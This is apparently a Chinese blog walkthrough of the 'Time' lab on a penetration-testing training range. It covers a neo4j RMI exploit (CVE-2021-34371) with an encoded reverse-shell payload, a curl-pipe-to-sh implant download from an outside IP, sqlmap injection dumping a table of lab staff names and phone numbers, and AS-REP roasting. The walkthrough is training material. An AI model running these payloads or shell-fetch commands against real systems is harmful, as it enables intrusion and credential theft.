---
title: "Time"
description: ""
slug: "Time"
date: "2025-06-22 19:00:49+08:00"
image: "assets/Pasted image 20250622193037.png"
categories: 
    - 靶机
    - 春秋云镜
tags: 
    - AS-REPRoasting
    - DCsync
    - pth
    - neo4j
draft: false
---

# 入口打点
```bash
└─$ ./gogo_linux_amd64 -i 39.98.127.100 -ev -p -
[*] gogo: , 2025-06-22 19:26.25
[warn] System fd limit: 1024 , Please exec 'ulimit -n 65535' 
[warn] Now set threads to 924 
[*] Current goroutines: 924, Version Level: 1,Exploit: auto, PortSpray: false , 2025-06-22 19:26.25
[*] Start task 39.98.127.100 ,total ports: 65535 , mod: default , 2025-06-22 19:26.25
[*] too much ports , only show top 100 ports: 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100...... , 2025-06-22 19:26.25
[*] Default Scan is expected to take 284 seconds , 2025-06-22 19:26.25
[+] tcp://39.98.127.100:22              ssh      [open] SSH-2.0-OpenS  
[+] tcp://39.98.127.100:1337            focus:java-rmi:active    [open] N\x00\x0f180.111.20 [ info: rmi_service payloads:path:JRMI\x00\x02K ]  
[+] https://39.98.127.100:7473          authenticate     [200] HTTP/1.1 200  
[+] http://39.98.127.100:7474           authenticate     [200] HTTP/1.1 200  
[+] tcp://39.98.127.100:38583           focus:java-rmi:active    [open] N\x00\x0f180.111.20 [ info: rmi_service payloads:path:JRMI\x00\x02K ]  
[+] https://39.98.127.100:7687                   [400] HTTP/1.1 400  
[*] Alived: 6, Total: 65535 , 2025-06-22 19:26.56
[*] Time consuming: 30.704288273s , 2025-06-22 19:26.56
```
## neo4j shell
存在一个neo4j，默认口令为neo4j/neo4j，登陆后查看版本
![](<assets/Pasted image 20250622193037.png>)
打一个CVE-2021-34371反弹shell
`java -jar .\rhino_gadget.jar rmi://39.98.127.100:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTYuMjM4LjIzMy45Lzg4OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"`
上线vshell并建立隧道
`(curl -fsSL -m180 http://156.238.233.9:8084/slt||wget -T180 -q http://156.238.233.9:8084/slt)|sh`
```bash
neo4j@ubuntu:/tmp$ cat ~/flag01.txt 
 ██████████ ██                    
░░░░░██░░░ ░░                     
    ░██     ██ ██████████   █████ 
    ░██    ░██░░██░░██░░██ ██░░░██
    ░██    ░██ ░██ ░██ ░██░███████
    ░██    ░██ ░██ ░██ ░██░██░░░░ 
    ░██    ░██ ███ ░██ ░██░░██████
    ░░     ░░ ░░░  ░░  ░░  ░░░░░░ 


flag01: flag{c3c58cfd-6c48-4844-9cc3-daa23905596b}

Do you know the authentication process of Kerberos? 
......This will be the key to your progress.
```
```bash
neo4j@ubuntu:/tmp$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.6.36  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe14:41c5  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:14:41:c5  txqueuelen 1000  (Ethernet)
        RX packets 208995  bytes 179729921 (179.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 110615  bytes 39298376 (39.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 786  bytes 67816 (67.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 786  bytes 67816 (67.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
fscan扫一下。
```powershell
neo4j@ubuntu:/tmp$ ./fscan -h 172.22.6.0/24 -eh 172.22.6.36
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-06-22 19:43:20] [INFO] 暴力破解线程数: 1
[2025-06-22 19:43:20] [INFO] 开始信息扫描
[2025-06-22 19:43:20] [INFO] CIDR范围: 172.22.6.0-172.22.6.255
[2025-06-22 19:43:20] [INFO] 生成IP范围: 172.22.6.0.%!d(string=172.22.6.255) - %!s(MISSING).%!d(MISSING)
[2025-06-22 19:43:20] [INFO] 解析CIDR 172.22.6.0/24 -> IP范围 172.22.6.0-172.22.6.255
[2025-06-22 19:43:20] [INFO] 已排除指定主机: 1 个
[2025-06-22 19:43:20] [INFO] 最终有效主机数量: 255
[2025-06-22 19:43:20] [INFO] 开始主机扫描
[2025-06-22 19:43:20] [INFO] 正在尝试无监听ICMP探测...
[2025-06-22 19:43:20] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-06-22 19:43:20] [INFO] 切换为PING方式探测...
[2025-06-22 19:43:20] [SUCCESS] 目标 172.22.6.12     存活 (ICMP)
[2025-06-22 19:43:23] [SUCCESS] 目标 172.22.6.25     存活 (ICMP)
[2025-06-22 19:43:23] [SUCCESS] 目标 172.22.6.38     存活 (ICMP)
[2025-06-22 19:43:26] [INFO] 存活主机数量: 3
[2025-06-22 19:43:26] [INFO] 有效端口数量: 233
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.38:80
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.38:22
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.25:135
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.12:135
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.25:139
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.12:445
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.12:389
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.12:139
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.12:88
[2025-06-22 19:43:26] [SUCCESS] 端口开放 172.22.6.25:445
[2025-06-22 19:43:27] [SUCCESS] 服务识别 172.22.6.38:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
[2025-06-22 19:43:32] [SUCCESS] 服务识别 172.22.6.38:80 => [http]
[2025-06-22 19:43:32] [SUCCESS] 服务识别 172.22.6.25:139 =>  Banner:[.]
[2025-06-22 19:43:32] [SUCCESS] 服务识别 172.22.6.12:445 => 
[2025-06-22 19:43:32] [SUCCESS] 服务识别 172.22.6.12:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
[2025-06-22 19:43:32] [SUCCESS] 服务识别 172.22.6.12:139 =>  Banner:[.]
[2025-06-22 19:43:32] [SUCCESS] 服务识别 172.22.6.12:88 => 
[2025-06-22 19:43:32] [SUCCESS] 服务识别 172.22.6.25:445 => 
[2025-06-22 19:44:32] [SUCCESS] 服务识别 172.22.6.25:135 => 
[2025-06-22 19:44:32] [SUCCESS] 服务识别 172.22.6.12:135 => 
[2025-06-22 19:44:32] [INFO] 存活端口数量: 10
[2025-06-22 19:44:32] [INFO] 开始漏洞扫描
[2025-06-22 19:44:32] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
[2025-06-22 19:44:32] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.6.12
主机名: DC-PROGAME
发现的网络接口:
   IPv4地址:
      └─ 172.22.6.12
[2025-06-22 19:44:32] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.6.25
主机名: WIN2019
发现的网络接口:
   IPv4地址:
      └─ 172.22.6.25
[2025-06-22 19:44:32] [SUCCESS] NetBios 172.22.6.25     XIAORANG\WIN2019              
[2025-06-22 19:44:32] [SUCCESS] 网站标题 http://172.22.6.38        状态码:200 长度:1531   标题:后台登录
[2025-06-22 19:44:32] [INFO] 系统信息 172.22.6.12 [Windows Server 2016 Datacenter 14393]
[2025-06-22 19:44:32] [SUCCESS] NetBios 172.22.6.12     DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393
[2025-06-22 19:44:55] [SUCCESS] 扫描已完成: 18/18
```

172.22.6.12                       DC:DC-PROGAME.xiaorang.lab
172.22.6.25                       XIAORANG\WIN2019      
172.22.6.36（入口机）
172.22.6.38                       后台系统

# 横向
## 172.22.6.38
![](<assets/Pasted image 20250622194927.png>)
```http
POST /index.php HTTP/1.1
Host: 172.22.6.38
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
DNT: 1
Accept-Encoding: gzip, deflate
Origin: http://172.22.6.38
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.22.6.38/
Content-Length: 30
  
username=admin&password=123456
```
抓包，测试存在sql注入
### sql注入
`proxychains4 -q sqlmap -u "http://172.22.6.38/index.php" --data="username=admin&password=123456"`
```shell
[20:00:51] [INFO] fetching entries of column(s) 'flag02' for table 'oa_f1Agggg' in database 'oa_db'
Database: oa_db
Table: oa_f1Agggg
[1 entry]
+--------------------------------------------+
| flag02                                     |
+--------------------------------------------+
| flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |
+--------------------------------------------+

+-----+----------------------------+-------------+-----------------+
| id  | email                      | phone       | username        |
+-----+----------------------------+-------------+-----------------+
| 245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        |
| 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        |
| 247 | buning@xiaorang.lab        | 13046481392 | BU NING         |
| 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         |
| 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         |
| 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           |
| 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      |
| 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        |
| 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       |
| 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          |
| 255 | kejuan@xiaorang.lab        | 13222550481 | KE JUAN         |
| 256 | gexin@xiaorang.lab         | 18181553086 | GE XIN          |
| 257 | lugu@xiaorang.lab          | 18793883130 | LU GU           |
| 258 | guzaicheng@xiaorang.lab    | 15309377043 | GU ZAI CHENG    |
| 259 | feicai@xiaorang.lab        | 13077435367 | FEI CAI         |
| 260 | ranqun@xiaorang.lab        | 18239164662 | RAN QUN         |
| 261 | zhouyi@xiaorang.lab        | 13169264671 | ZHOU YI         |
| 262 | shishu@xiaorang.lab        | 18592890189 | SHI SHU         |
| 263 | yanyun@xiaorang.lab        | 15071085768 | YAN YUN         |
| 264 | chengqiu@xiaorang.lab      | 13370162980 | CHENG QIU       |
| 265 | louyou@xiaorang.lab        | 13593582379 | LOU YOU         |
| 266 | maqun@xiaorang.lab         | 15235945624 | MA QUN          |
| 267 | wenbiao@xiaorang.lab       | 13620643639 | WEN BIAO        |
| 268 | weishengshan@xiaorang.lab  | 18670502260 | WEI SHENG SHAN  |
| 269 | zhangxin@xiaorang.lab      | 15763185760 | ZHANG XIN       |
| 270 | chuyuan@xiaorang.lab       | 18420545268 | CHU YUAN        |
| 271 | wenliang@xiaorang.lab      | 13601678032 | WEN LIANG       |
| 272 | yulvxue@xiaorang.lab       | 18304374901 | YU LV XUE       |
| 273 | luyue@xiaorang.lab         | 18299785575 | LU YUE          |
| 274 | ganjian@xiaorang.lab       | 18906111021 | GAN JIAN        |
| 275 | pangzhen@xiaorang.lab      | 13479328562 | PANG ZHEN       |
| 276 | guohong@xiaorang.lab       | 18510220597 | GUO HONG        |
| 277 | lezhong@xiaorang.lab       | 15320909285 | LE ZHONG        |
| 278 | sheweiyue@xiaorang.lab     | 13736399596 | SHE WEI YUE     |
| 279 | dujian@xiaorang.lab        | 15058892639 | DU JIAN         |
| 280 | lidongjin@xiaorang.lab     | 18447207007 | LI DONG JIN     |
| 281 | hongqun@xiaorang.lab       | 15858462251 | HONG QUN        |
| 282 | yexing@xiaorang.lab        | 13719043564 | YE XING         |
| 283 | maoda@xiaorang.lab         | 13878840690 | MAO DA          |
| 284 | qiaomei@xiaorang.lab       | 13053207462 | QIAO MEI        |
| 285 | nongzhen@xiaorang.lab      | 15227699960 | NONG ZHEN       |
| 286 | dongshu@xiaorang.lab       | 15695562947 | DONG SHU        |
| 287 | zhuzhu@xiaorang.lab        | 13070163385 | ZHU ZHU         |
| 288 | jiyun@xiaorang.lab         | 13987332999 | JI YUN          |
| 289 | qiguanrou@xiaorang.lab     | 15605983582 | QI GUAN ROU     |
| 290 | yixue@xiaorang.lab         | 18451603140 | YI XUE          |
| 291 | chujun@xiaorang.lab        | 15854942459 | CHU JUN         |
| 292 | shenshan@xiaorang.lab      | 17712052191 | SHEN SHAN       |
| 293 | lefen@xiaorang.lab         | 13271196544 | LE FEN          |
| 294 | yubo@xiaorang.lab          | 13462202742 | YU BO           |
| 295 | helianrui@xiaorang.lab     | 15383000907 | HE LIAN RUI     |
| 296 | xuanqun@xiaorang.lab       | 18843916267 | XUAN QUN        |
| 297 | shangjun@xiaorang.lab      | 15162486698 | SHANG JUN       |
| 298 | huguang@xiaorang.lab       | 18100586324 | HU GUANG        |
| 299 | wansifu@xiaorang.lab       | 18494761349 | WAN SI FU       |
| 300 | fenghong@xiaorang.lab      | 13536727314 | FENG HONG       |
| 301 | wanyan@xiaorang.lab        | 17890844429 | WAN YAN         |
| 302 | diyan@xiaorang.lab         | 18534028047 | DI YAN          |
| 303 | xiangyu@xiaorang.lab       | 13834043047 | XIANG YU        |
| 304 | songyan@xiaorang.lab       | 15282433280 | SONG YAN        |
| 305 | fandi@xiaorang.lab         | 15846960039 | FAN DI          |
| 306 | xiangjuan@xiaorang.lab     | 18120327434 | XIANG JUAN      |
| 307 | beirui@xiaorang.lab        | 18908661803 | BEI RUI         |
| 308 | didi@xiaorang.lab          | 13413041463 | DI DI           |
| 309 | zhubin@xiaorang.lab        | 15909558554 | ZHU BIN         |
| 310 | lingchun@xiaorang.lab      | 13022790678 | LING CHUN       |
| 311 | zhenglu@xiaorang.lab       | 13248244873 | ZHENG LU        |
| 312 | xundi@xiaorang.lab         | 18358493414 | XUN DI          |
| 313 | wansishun@xiaorang.lab     | 18985028319 | WAN SI SHUN     |
| 314 | yezongyue@xiaorang.lab     | 13866302416 | YE ZONG YUE     |
| 315 | bianmei@xiaorang.lab       | 18540879992 | BIAN MEI        |
| 316 | shanshao@xiaorang.lab      | 18791488918 | SHAN SHAO       |
| 317 | zhenhui@xiaorang.lab       | 13736784817 | ZHEN HUI        |
| 318 | chengli@xiaorang.lab       | 15913267394 | CHENG LI        |
| 319 | yufen@xiaorang.lab         | 18432795588 | YU FEN          |
| 320 | jiyi@xiaorang.lab          | 13574211454 | JI YI           |
| 321 | panbao@xiaorang.lab        | 13675851303 | PAN BAO         |
| 322 | mennane@xiaorang.lab       | 15629706208 | MEN NAN E       |
| 323 | fengsi@xiaorang.lab        | 13333432577 | FENG SI         |
| 324 | mingyan@xiaorang.lab       | 18296909463 | MING YAN        |
| 325 | luoyou@xiaorang.lab        | 15759321415 | LUO YOU         |
| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |
| 327 | nongyan@xiaorang.lab       | 18097386975 | NONG YAN        |
| 328 | haolun@xiaorang.lab        | 15152700465 | HAO LUN         |
| 329 | oulun@xiaorang.lab         | 13402760696 | OU LUN          |
| 330 | weichipeng@xiaorang.lab    | 18057058937 | WEI CHI PENG    |
| 331 | qidiaofang@xiaorang.lab    | 18728297829 | QI DIAO FANG    |
| 332 | xuehe@xiaorang.lab         | 13398862169 | XUE HE          |
| 333 | chensi@xiaorang.lab        | 18030178713 | CHEN SI         |
| 334 | guihui@xiaorang.lab        | 17882514129 | GUI HUI         |
| 335 | fuyue@xiaorang.lab         | 18298436549 | FU YUE          |
| 336 | wangxing@xiaorang.lab      | 17763645267 | WANG XING       |
| 337 | zhengxiao@xiaorang.lab     | 18673968392 | ZHENG XIAO      |
| 338 | guhui@xiaorang.lab         | 15166711352 | GU HUI          |
| 339 | baoai@xiaorang.lab         | 15837430827 | BAO AI          |
| 340 | hangzhao@xiaorang.lab      | 13235488232 | HANG ZHAO       |
| 341 | xingye@xiaorang.lab        | 13367587521 | XING YE         |
| 342 | qianyi@xiaorang.lab        | 18657807767 | QIAN YI         |
| 343 | xionghong@xiaorang.lab     | 17725874584 | XIONG HONG      |
| 344 | zouqi@xiaorang.lab         | 15300430128 | ZOU QI          |
| 345 | rongbiao@xiaorang.lab      | 13034242682 | RONG BIAO       |
| 346 | gongxin@xiaorang.lab       | 15595839880 | GONG XIN        |
| 347 | luxing@xiaorang.lab        | 18318675030 | LU XING         |
| 348 | huayan@xiaorang.lab        | 13011805354 | HUA YAN         |
| 349 | duyue@xiaorang.lab         | 15515878208 | DU YUE          |
| 350 | xijun@xiaorang.lab         | 17871583183 | XI JUN          |
| 351 | daiqing@xiaorang.lab       | 18033226216 | DAI QING        |
| 352 | yingbiao@xiaorang.lab      | 18633421863 | YING BIAO       |
| 353 | hengteng@xiaorang.lab      | 15956780740 | HENG TENG       |
| 354 | changwu@xiaorang.lab       | 15251485251 | CHANG WU        |
| 355 | chengying@xiaorang.lab     | 18788248715 | CHENG YING      |
| 356 | luhong@xiaorang.lab        | 17766091079 | LU HONG         |
| 357 | tongxue@xiaorang.lab       | 18466102780 | TONG XUE        |
| 358 | xiangqian@xiaorang.lab     | 13279611385 | XIANG QIAN      |
| 359 | shaokang@xiaorang.lab      | 18042645434 | SHAO KANG       |
| 360 | nongzhu@xiaorang.lab       | 13934236634 | NONG ZHU        |
| 361 | haomei@xiaorang.lab        | 13406913218 | HAO MEI         |
| 362 | maoqing@xiaorang.lab       | 15713298425 | MAO QING        |
| 363 | xiai@xiaorang.lab          | 18148404789 | XI AI           |
| 364 | bihe@xiaorang.lab          | 13628593791 | BI HE           |
| 365 | gaoli@xiaorang.lab         | 15814408188 | GAO LI          |
| 366 | jianggong@xiaorang.lab     | 15951118926 | JIANG GONG      |
| 367 | pangning@xiaorang.lab      | 13443921700 | PANG NING       |
| 368 | ruishi@xiaorang.lab        | 15803112819 | RUI SHI         |
| 369 | wuhuan@xiaorang.lab        | 13646953078 | WU HUAN         |
| 370 | qiaode@xiaorang.lab        | 13543564200 | QIAO DE         |
| 371 | mayong@xiaorang.lab        | 15622971484 | MA YONG         |
| 372 | hangda@xiaorang.lab        | 15937701659 | HANG DA         |
| 373 | changlu@xiaorang.lab       | 13734991654 | CHANG LU        |
| 374 | liuyuan@xiaorang.lab       | 15862054540 | LIU YUAN        |
| 375 | chenggu@xiaorang.lab       | 15706685526 | CHENG GU        |
| 376 | shentuyun@xiaorang.lab     | 15816902379 | SHEN TU YUN     |
| 377 | zhuangsong@xiaorang.lab    | 17810274262 | ZHUANG SONG     |
| 378 | chushao@xiaorang.lab       | 18822001640 | CHU SHAO        |
| 379 | heli@xiaorang.lab          | 13701347081 | HE LI           |
| 380 | haoming@xiaorang.lab       | 15049615282 | HAO MING        |
| 381 | xieyi@xiaorang.lab         | 17840660107 | XIE YI          |
| 382 | shangjie@xiaorang.lab      | 15025010410 | SHANG JIE       |
| 383 | situxin@xiaorang.lab       | 18999728941 | SI TU XIN       |
| 384 | linxi@xiaorang.lab         | 18052976097 | LIN XI          |
| 385 | zoufu@xiaorang.lab         | 15264535633 | ZOU FU          |
| 386 | qianqing@xiaorang.lab      | 18668594658 | QIAN QING       |
| 387 | qiai@xiaorang.lab          | 18154690198 | QI AI           |
| 388 | ruilin@xiaorang.lab        | 13654483014 | RUI LIN         |
| 389 | luomeng@xiaorang.lab       | 15867095032 | LUO MENG        |
| 390 | huaren@xiaorang.lab        | 13307653720 | HUA REN         |
| 391 | yanyangmei@xiaorang.lab    | 15514015453 | YAN YANG MEI    |
| 392 | zuofen@xiaorang.lab        | 15937087078 | ZUO FEN         |
| 393 | manyuan@xiaorang.lab       | 18316106061 | MAN YUAN        |
| 394 | yuhui@xiaorang.lab         | 18058257228 | YU HUI          |
| 395 | sunli@xiaorang.lab         | 18233801124 | SUN LI          |
| 396 | guansixin@xiaorang.lab     | 13607387740 | GUAN SI XIN     |
| 397 | ruisong@xiaorang.lab       | 13306021674 | RUI SONG        |
| 398 | qiruo@xiaorang.lab         | 13257810331 | QI RUO          |
| 399 | jinyu@xiaorang.lab         | 18565922652 | JIN YU          |
| 400 | shoujuan@xiaorang.lab      | 18512174415 | SHOU JUAN       |
| 401 | yanqian@xiaorang.lab       | 13799789435 | YAN QIAN        |
| 402 | changyun@xiaorang.lab      | 18925015029 | CHANG YUN       |
| 403 | hualu@xiaorang.lab         | 13641470801 | HUA LU          |
| 404 | huanming@xiaorang.lab      | 15903282860 | HUAN MING       |
| 405 | baoshao@xiaorang.lab       | 13795275611 | BAO SHAO        |
| 406 | hongmei@xiaorang.lab       | 13243605925 | HONG MEI        |
| 407 | manyun@xiaorang.lab        | 13238107359 | MAN YUN         |
| 408 | changwan@xiaorang.lab      | 13642205622 | CHANG WAN       |
| 409 | wangyan@xiaorang.lab       | 13242486231 | WANG YAN        |
| 410 | shijian@xiaorang.lab       | 15515077573 | SHI JIAN        |
| 411 | ruibei@xiaorang.lab        | 18157706586 | RUI BEI         |
| 412 | jingshao@xiaorang.lab      | 18858376544 | JING SHAO       |
| 413 | jinzhi@xiaorang.lab        | 18902437082 | JIN ZHI         |
| 414 | yuhui@xiaorang.lab         | 15215599294 | YU HUI          |
| 415 | zangpeng@xiaorang.lab      | 18567574150 | ZANG PENG       |
| 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       |
| 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          |
| 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         |
| 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         |
| 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         |
| 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       |
| 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   |
| 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         |
| 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         |
| 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          |
| 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          |
| 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        |
| 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    |
| 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        |
| 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         |
| 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     |
| 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        |
| 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        |
| 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         |
| 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       |
| 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        |
| 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   |
| 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    |
| 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       |
| 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        |
| 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     |
| 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     |
| 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           |
| 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          |
| 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         |
| 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          |
| 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          |
| 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        |
| 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  |
| 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     |
| 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          |
| 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      |
| 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        |
| 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    |
| 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       |
| 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         |
| 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          |
| 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        |
| 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          |
| 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         |
| 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        |
| 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       |
| 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         |
| 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         |
| 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      |
| 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         |
| 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       |
| 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        |
| 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        |
| 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          |
| 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       |
| 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           |
| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |
| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |
| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |
| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |
| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |
| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |
| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |
| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |
| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |
| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |
| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |
| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |
| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |
| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |
| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |
| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |
| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |
| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |
| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |
| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |
| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |
| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |
| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |
| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |
| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |
| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |
| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |
| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |
+-----+----------------------------+-------------+-----------------+
```
`cat tmp | grep -Po '[a-z]+@xiaorang.lab'  > user.txt`
将用户名提取一下。
### AS-REPRoasting
结合上面的提示，利用kerberos。
在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN，所以当我们没有域凭证时，可以通过Kerberos pre-auth从域外对域用户进行用户枚举
对于域用户，如果设置了选项Do not require Kerberos preauthentication(不要求Kerberos预身份认证)，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat或是john对其破解，最终获得该用户的明文口令
`proxychains4 -q impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile ./user.txt xiaorang.lab/`
可以得到一个用户的hash
```text
